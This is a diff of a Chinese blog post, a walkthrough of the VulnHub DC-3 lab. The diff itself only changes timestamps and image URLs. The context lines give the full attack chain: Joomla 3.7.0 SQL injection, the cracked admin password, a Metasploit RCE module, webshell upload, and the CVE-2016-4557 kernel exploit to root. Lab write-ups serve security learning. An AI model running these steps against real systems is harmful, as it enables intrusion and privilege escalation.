@@ -51,7 +51,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-03-12T04:00:00.000Z">
-<meta property="article:modified_time" content="2026-05-14T10:04:40.419Z">
+<meta property="article:modified_time" content="2026-05-14T13:37:56.008Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="靶机渗透">
 <meta property="article:tag" content="VulnHub">
@@ -68,7 +68,7 @@
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp5bt8na">
+  <link rel="stylesheet" href="/css/main.css?v=mp5jbjbf">
 
 
   
@@ -77,7 +77,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-12T12:00:00+08:00","dateModified":"2026-05-14T18:04:40+08:00","datePublished":"2026-03-12T12:00:00+08:00","description":"","headline":"VulnHub DC-3 靶机渗透测试笔记","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/b169bdb4/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/b169bdb4/","keywords":"靶机渗透, VulnHub, vulnhub-DC, 提权, Joomla","thumbnailUrl":"/images/VulnHub.jpg","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-12T12:00:00+08:00","dateModified":"2026-05-14T21:37:56+08:00","datePublished":"2026-03-12T12:00:00+08:00","description":"","headline":"VulnHub DC-3 靶机渗透测试笔记","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/b169bdb4/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/b169bdb4/","keywords":"靶机渗透, VulnHub, vulnhub-DC, 提权, Joomla","thumbnailUrl":"/images/VulnHub.jpg","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -131,11 +131,11 @@
 </blockquote>
 <hr>
 <h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1 主机发现"></a>1.1 主机发现</h3><p>查看本机网段，确认目标网段：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image1.png"></p>
 <p>使用 nmap 扫描存活主机：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.168.0/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image2.png"></p>
 <p>扫描结果：</p>
 <ul>
 <li><code>192.168.168.1</code> → VM8 网卡</li>
@@ -147,47 +147,47 @@
 <h3 id="1-2-端口与服务扫描"><a href="#1-2-端口与服务扫描" class="headerlink" title="1.2 端口与服务扫描"></a>1.2 端口与服务扫描</h3><p>对目标进行全端口详细扫描：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 192.168.168.129</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image3.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image3.png"></p>
 <blockquote>
 <p>DC-3 只开放了 80 端口，攻击面集中在 Web 应用。</p>
 </blockquote>
 <h3 id="1-3-Web-信息收集"><a href="#1-3-Web-信息收集" class="headerlink" title="1.3 Web 信息收集"></a>1.3 Web 信息收集</h3><p>浏览器访问目标网站：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.129/</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image4.png"></p>
 <p>使用 Wappalyzer 识别 CMS 类型：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image5.png"></p>
 <p>确认为 <strong>Joomla CMS</strong>，接下来针对 Joomla 进行专项扫描。</p>
 <h3 id="1-4-目录扫描"><a href="#1-4-目录扫描" class="headerlink" title="1.4 目录扫描"></a>1.4 目录扫描</h3><p>使用 dirsearch 扫描目录，找到后台入口：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.168.129/</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image6.png"></p>
 <p>发现后台登录页面：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.129/administrator/</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image7.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image7.png"></p>
 <hr>
 <h2 id="二、漏洞扫描"><a href="#二、漏洞扫描" class="headerlink" title="二、漏洞扫描"></a>二、漏洞扫描</h2><h3 id="2-1-使用-JoomScan-识别版本"><a href="#2-1-使用-JoomScan-识别版本" class="headerlink" title="2.1 使用 JoomScan 识别版本"></a>2.1 使用 JoomScan 识别版本</h3><p>搜索 Joomla 专用漏洞扫描工具 JoomScan：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image8.png"></p>
 <p>安装并使用：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install joomscan</span><br><span class="line">joomscan -u 192.168.168.129</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image9.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image10.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image10.png"></p>
 <p>确认 Joomla 版本为 <strong>3.7.0</strong>：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image11.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image11.png"></p>
 <h3 id="2-2-搜索-Joomla-3-7-0-漏洞"><a href="#2-2-搜索-Joomla-3-7-0-漏洞" class="headerlink" title="2.2 搜索 Joomla 3.7.0 漏洞"></a>2.2 搜索 Joomla 3.7.0 漏洞</h3><p>搜索该版本已知漏洞：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image12.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260306135733891.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image12.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260306135733891.png"></p>
 <p>确认存在漏洞，在 MSF 中搜索：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search joomla 3.7</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image14.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image14.png"></p>
 <hr>
 <h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><h3 id="3-1-MSF-利用（失败）"><a href="#3-1-MSF-利用（失败）" class="headerlink" title="3.1 MSF 利用（失败）"></a>3.1 MSF 利用（失败）</h3><p>尝试使用 MSF 模块直接利用：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/joomla_comfields_sqli_rce</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.168.129</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image15.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image15.png"></p>
 <p>报错：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">No logged-in Administrator or Super User user found!</span><br><span class="line">Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>
 
@@ -197,16 +197,16 @@
 <h3 id="3-2-SQL-注入获取管理员密码"><a href="#3-2-SQL-注入获取管理员密码" class="headerlink" title="3.2 SQL 注入获取管理员密码"></a>3.2 SQL 注入获取管理员密码</h3><p>使用 searchsploit 找到 SQL 注入利用脚本：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.7</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image16.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image16.png"></p>
 <p>找到并查看利用脚本：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name 44227.php</span><br><span class="line"><span class="built_in">cat</span> /usr/share/exploitdb/exploits/php/remote/44227.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image17.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image17.png"></p>
 <p>启动 PHP 内置服务器运行该脚本：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:8888</span><br><span class="line"><span class="comment"># 若报错先安装依赖</span></span><br><span class="line">apt install php-curl -y</span><br></pre></td></tr></table></figure>
 
 <p>（通过网站访问）</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image18.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image18.png"></p>
 <p>输入目标 IP 执行攻击，获取到数据库信息：</p>
 <table>
 <thead>
@@ -243,18 +243,18 @@
 <p>将 hash 去在线工具破解，得到明文密码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snoopy</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image19.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image19.png"></p>
 <blockquote>
 <p>如在线工具解不出，也可以用 john 或 hashcat 配合字典爆破。</p>
 </blockquote>
 <h3 id="3-3-登录后台"><a href="#3-3-登录后台" class="headerlink" title="3.3 登录后台"></a>3.3 登录后台</h3><p>使用获取到的账号登录 Joomla 后台：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.129/administrator/</span><br><span class="line">账号：admin</span><br><span class="line">密码：snoopy</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image20.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image20.png"></p>
 <p>登录成功后，回到 MSF 重新执行攻击，这次成功获取 shell：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/webapp/joomla_comfields_sqli_rce</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.168.129</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image21.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image21.png"></p>
 <blockquote>
 <p><strong>漏洞原理说明：</strong></p>
 <ul>
@@ -264,47 +264,47 @@
 </blockquote>
 <hr>
 <h2 id="四、后渗透与提权"><a href="#四、后渗透与提权" class="headerlink" title="四、后渗透与提权"></a>四、后渗透与提权</h2><h3 id="4-1-查看当前权限"><a href="#4-1-查看当前权限" class="headerlink" title="4.1 查看当前权限"></a>4.1 查看当前权限</h3><p>获取 shell 后确认当前用户权限：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image22.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image22.png"></p>
 <p>当前为 <strong>www-data</strong> 权限，需要提权。</p>
 <h3 id="4-2-上传-Webshell"><a href="#4-2-上传-Webshell" class="headerlink" title="4.2 上传 Webshell"></a>4.2 上传 Webshell</h3><p>（为了用哥斯拉，也可以不用）</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image23.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image23.png"></p>
 <p>通过 MSF 上传 PHP Webshell 到 Web 目录：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload <span class="string">&#x27;/home/kali/桌面/shell.php&#x27;</span> /var/www/html/templates/beez3</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image24.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image24.png"></p>
 <p>浏览器访问确认 Webshell 正常运行：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.129/templates/beez3/shell.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image25.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image25.png"></p>
 <h3 id="4-3-使用-Linux-Exploit-Suggester-枚举提权方向"><a href="#4-3-使用-Linux-Exploit-Suggester-枚举提权方向" class="headerlink" title="4.3 使用 Linux Exploit Suggester 枚举提权方向"></a>4.3 使用 Linux Exploit Suggester 枚举提权方向</h3><p>下载提权辅助工具：</p>
 <p>可以直接在靶机上下载</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image26.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image26.png"></p>
 <p>升级为交互式终端并执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">chmod</span> 777 les.sh</span><br><span class="line">./les.sh</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image27.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image27.png"></p>
 <p>工具推荐了多个可用的内核提权漏洞，选择使用 <strong>CVE-2016-4557（eBPF 双重释放漏洞）</strong>，（比脏牛更稳定。因为脏牛的一个exp失败了，就中间这个，靶机崩了，下面的就是脏牛的，先编译，后续不写了，靶机崩了3次）</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image29.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image30.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image29.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image30.png"></p>
 <p>注：直接用脏牛（40611.c）时靶机容易崩溃，因此换用了更稳定的 eBPF 利用方式。</p>
 <h3 id="4-4-内核提权（CVE-2016-4557）"><a href="#4-4-内核提权（CVE-2016-4557）" class="headerlink" title="4.4 内核提权（CVE-2016-4557）"></a>4.4 内核提权（CVE-2016-4557）</h3><p>kali搜索漏洞</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image31.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image31.png"></p>
 <p>txt里面提供了exp的下载链接</p>
 <p>下载 exp 并通过 Webshell（哥斯拉）上传到靶机：</p>
 <p>图片给错了，上传的是exploit.tar这个exp</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image28.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image28.png"></p>
 <p>解压并编译执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image34.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image34.png"></p>
 <h3 id="4-5-获取-root-权限"><a href="#4-5-获取-root-权限" class="headerlink" title="4.5 获取 root 权限"></a>4.5 获取 root 权限</h3><p>成功提权到 root，获取最终 flag：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> the-flag.txt</span><br></pre></td></tr></table></figure>
 
 
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/DC-3_image35.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/DC-3_image35.png"></p>
 <hr>
 <h2 id="五、渗透流程总结"><a href="#五、渗透流程总结" class="headerlink" title="五、渗透流程总结"></a>五、渗透流程总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">信息收集（nmap + dirsearch）</span><br><span class="line">    ↓</span><br><span class="line">发现 Joomla 3.7.0 → JoomScan 确认版本</span><br><span class="line">    ↓</span><br><span class="line">SQL注入（44227.php）→ 获取管理员 hash → 破解得到 snoopy</span><br><span class="line">    ↓</span><br><span class="line">登录后台 → MSF 写入 Webshell → 获取 www-data shell</span><br><span class="line">    ↓</span><br><span class="line">上传 les.sh 枚举提权漏洞</span><br><span class="line">    ↓</span><br><span class="line">CVE-2016-4557 eBPF 内核提权 → root → flag ✅</span><br></pre></td></tr></table></figure>
 
@@ -807,7 +807,7 @@
 </script>
 
 <!-- required -->
-<script src="/js/main.js?v=mp5bt8nc" defer></script>
+<script src="/js/main.js?v=mp5jbjbh" defer></script>
 
 <script type="text/javascript">
   const applyTheme = (theme) => {
@@ -1071,7 +1071,7 @@
 <script src="/js/plugins/hotkeys.js"></script>
 
 <!-- Achievements / Card System -->
-<script src="/js/plugins/achievements.js?v=mp5bt8nc"></script>
+<script src="/js/plugins/achievements.js?v=mp5jbjbi"></script>
 
 <!-- Special Days - 节日彩蛋系统 -->
 <script src="/js/plugins/special-days.js"></script>
